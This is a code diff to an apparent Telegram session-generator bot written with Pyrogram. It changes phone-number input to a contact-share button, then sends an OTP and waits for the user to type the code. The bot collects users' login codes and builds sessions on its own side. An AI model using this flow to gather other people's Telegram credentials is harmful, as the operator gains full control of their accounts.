@@ -14,6 +14,7 @@ from pyrogram.errors import (
     SessionPasswordNeeded,
     PasswordHashInvalid,
 )
+from pyrogram.types import KeyboardButton, ReplyKeyboardMarkup
 
 # Function to generate random name
 def generate_random_name(length=7):
@@ -65,22 +66,33 @@ async def generate_session(_, message):
 
     user_id = message.chat.id
 
-    # Ask for phone number (Fix to use listen method for user input)
-    phone_number_msg = await message.reply("Please enter your phone number along with the country code.\nExample: +19876543210")
+    # Ask the user to share their contact
+    contact_button = KeyboardButton("Share Contact", request_contact=True)
+    reply_markup = ReplyKeyboardMarkup([[contact_button]], resize_keyboard=True)
 
-    # Waiting for the message from the user
-    phone_number_response = await _.listen(user_id, filters=filters.text)
-
-    phone_number = phone_number_response.text if phone_number_response else None
-
-    if not phone_number:
-        await message.reply("❌ No phone number received. Please try again.")
-        return
+    # Send a message asking the user to share their contact
+    phone_number_msg = await message.reply(
+        "Please share your contact number by clicking the button below.",
+        reply_markup=reply_markup
+    )
     
+    # Waiting for the contact to be shared
+    contact_response = await _.listen(user_id, filters=filters.contact)
+
+    if not contact_response or not contact_response.contact:
+        await message.reply("❌ No contact received. Please try again.")
+        return
+
+    phone_number = contact_response.contact.phone_number
+    await message.reply(f"📲 Received phone number: {phone_number}")
+
     try:
         await message.reply("📲 Sending OTP...")
+
+        # Create a new Client instance for each user to handle login independently
         client = Client(f"session_{user_id}", api_id, api_hash)
         await client.connect()
+
     except Exception as e:
         await message.reply(f"❌ Failed to send OTP {e}. Please wait and try again later.")
         return
@@ -95,7 +107,7 @@ async def generate_session(_, message):
         await message.reply('❌ Invalid phone number. Please restart the session.')
         return
 
-    # Ask for OTP (Fix to use listen method for OTP input)
+    # Ask for OTP (using listen() for OTP input)
     otp_code_msg = await _.listen(user_id, filters=filters.text, timeout=600)
     if not otp_code_msg:
         await message.reply('⏰ Time limit of 10 minutes exceeded. Please restart the session.')
